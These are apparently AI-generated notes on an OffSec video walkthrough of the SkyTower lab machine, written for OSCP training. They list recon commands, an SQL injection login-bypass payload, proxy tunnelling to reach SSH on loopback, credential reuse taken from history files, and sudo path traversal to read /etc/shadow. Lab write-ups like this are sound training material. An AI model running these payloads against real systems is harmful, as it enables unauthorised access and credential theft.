The video you provided, **"SkyTower With S1REN"** from the **OffSec** channel, is a complete walkthrough for the vulnerable machine **SkyTower**.

Below are the comprehensive notes and all major commands covering the key stages: **Reconnaissance**, **Web Exploitation (SQLi Bypass)**, **Tunneling**, and **Privilege Escalation**.

---

## 1. Initial Reconnaissance & Enumeration

The initial phase focused on identifying open services and hidden files/directories.

| Command/Action | Details & Outcome | Timestamp |
| :--- | :--- | :--- |
| **Nmap Scan** | `nmap -p- -sV -sC [Target IP] --open` | Scans all TCP ports. Found two open ports: **80 (HTTP)** running **Apache 2.2.22** on Debian, and **3128** running **Squid HTTP Proxy 3.1.20**. | [[20:29](http://www.youtube.com/watch?v=3fxgnucsDY8&t=1229)] |
| **Wfuzz (File/Directory Busting)** | `wfuzz -c -w [path/to/wordlist] -u http://[Target IP]/FUZZ` | Directory and file fuzzing identified the following files and directories (some were 403 Forbidden): `index.html`, `login.php`, `cgi-bin`, and `server-status`. | [[27:13](http://www.youtube.com/watch?v=3fxgnucsDY8&t=1633)] |
| **Nikto Scan** | `nikto --host http://[Target IP]` | Confirmed web technology is **PHP 5.4** on **Debian** and verified allowed HTTP methods (`GET`, `HEAD`, `POST`, `OPTIONS`). | [[32:22](http://www.youtube.com/watch?v=3fxgnucsDY8&t=1942)] |

---

## 2. Web Exploitation: SQLi Filtering Bypass

The web application hosted a login form at `login.php`. Initial SQL injection (SQLi) attempts were filtered, requiring a bypass technique.

| Step | Action/Payload | Details & Outcome | Timestamp |
| :--- | :--- | :--- | :--- |
| **SQLi Discovery** | Initial tests with `'` (single quote) | Revealed **verbose, error-based SQLi** messages from the backend **MySQL** server. | [[44:46](http://www.youtube.com/watch?v=3fxgnucsDY8&t=2686)] |
| **Filtering Evasion** | Use programmatic **OR** operator (`||`) | The standard SQL keyword `OR` was filtered. The programmatic alternative (`||`) was used to evade the filter, a common technique in certain MySQL environments. | [[52:50](http://www.youtube.com/watch?v=3fxgnucsDY8&t=3170)] |
| **Successful Authentication Bypass** | Payload: `' **|| 1=1 -- -**` | This payload successfully bypassed the login form, granting access to a "Welcome John" page. The page contained an important clue: "you must log into the skytech server via **ssh**". | [[54:47](http://www.youtube.com/watch?v=3fxgnucsDY8&t=3287)] |

---

## 3. Lateral Movement: Proxy Tunneling

Since Nmap didn't show SSH (port 22) open publicly, but the web app confirmed its existence, it was concluded that SSH was running on the **local loopback interface (`127.0.0.1`)**. The Squid Proxy on port 3128 was used to create a tunnel for access.

| Command/Action | Details & Outcome | Timestamp |
| :--- | :--- | :--- |
| **Netstat Check** | `netstat -antup` | *After initial access (though this step is implied before tunneling)*: Confirmed that port 22 (SSH) and 3306 (MySQL) were listening only on `127.0.0.1`. | [[01:12:20](http://www.youtube.com/watch?v=3fxgnucsDY8&t=4340)] |
| **Proxy Tunnel Creation** | `proxytunnel -p [Target IP]:3128 -d 127.0.0.1:22 -l 4444` | This command uses the Squid Proxy (`-p [Target IP]:3128`) to tunnel (`-d`) into the internal SSH service (`127.0.0.1:22`), creating a local listener (`-l`) on the attacker's machine on port **4444**. | [[01:01:12](http://www.youtube.com/watch?v=3fxgnucsDY8&t=3672)] |
| **SSH Login** | `ssh john@127.0.0.1 -p 4444` | Connects to the local listener (4444), which is forwarded to the target's internal SSH. | [[01:03:03](http://www.youtube.com/watch?v=3fxgnucsDY8&t=3783)] |
| **John's Password** | `hereisjohn` | Used to log in as user `john` (found later in the database, but confirmed here). | [[01:03:32](http://www.youtube.com/watch?v=3fxgnucsDY8&t=3812)] |

---

## 4. Privilege Escalation

After gaining a shell as `john`, a path was found to the root user through a privileged command.

| Command/Action | Details & Outcome | Timestamp |
| :--- | :--- | :--- |
| **Credential Discovery** | `cat .mysql_history` | Found in `john`'s home directory. Revealed a root login command for the local MySQL database: `mysql -u root -p root` (Username: **root**, Password: **root**). | [[01:13:42](http://www.youtube.com/watch?v=3fxgnucsDY8&t=4422)] |
| **Database Query** | `mysql -u root -p root` **(use skytech; SELECT * FROM login;)** | Queried the `skytech` database, revealing the username and password hash for user **sarah**. Sarah's password was cracked/found: `ilovemyjob`. | [[01:14:39](http://www.youtube.com/watch?v=3fxgnucsDY8&t=4479)] |
| **Switch User & Sudo Check** | `su sarah` followed by `sudo -l` | Switched to `sarah` using the new password. The `sudo -l` command revealed a key vulnerability: `sarah` can run the `/bin/cat` command on files inside the `/accounts` directory **as any user (including root)**. | [[01:15:47](http://www.youtube.com/watch?v=3fxgnucsDY8&t=4547)] |
| **Path Traversal Exploit** | `sudo /bin/cat /accounts/../../etc/shadow` | The **Path Traversal** payload (`../../`) breaks out of the restricted `/accounts` directory to read the system-wide `/etc/shadow` file, which contains all user hashes, including **root's**. | [[01:17:27](http://www.youtube.com/watch?v=3fxgnucsDY8&t=4647)] |
| **Root Password Shortcut** | `sudo /bin/cat /accounts/../../root/flag.txt` | The video takes a CTF shortcut by reading the flag file, which conveniently contains the root password: **theskytower**. | [[01:23:29](http://www.youtube.com/watch?v=3fxgnucsDY8&t=5009)] |
| **Final Root Access** | `su root` with password `theskytower` | Successfully gained a root shell. | [[01:23:43](http://www.youtube.com/watch?v=3fxgnucsDY8&t=5023)] |

---

## 📝 OSCP Takeaway Concepts

* **Programmatic SQLi Evasion:** When standard SQL keywords (`OR`, `UNION`) are filtered, test alternative programmatic operators (e.g., `||` for `OR`) to bypass the filter.
* **Tunneling/Pivoting:** The combination of `netstat` enumeration and abusing an accessible proxy service (Squid) via **ProxyTunnel** is an effective way to access services (like SSH) that are restricted to the loopback interface (`127.0.0.1`).
* **Sudo Path Traversal:** If a user can run a file-reading utility (`cat`, `less`, `more`) with `sudo` permissions but a restricted path, use the traversal sequence (`../`) to escape the path and read any sensitive file on the system (e.g., `/etc/shadow`).
* **Post-Exploitation Loot:** Always check history files (`.bash_history`, `.mysql_history`) in user home directories for exposed credentials or commands. | [[01:13:42](http://www.youtube.com/watch?v=3fxgnucsDY8&t=4422)] |

http://googleusercontent.com/youtube_content/0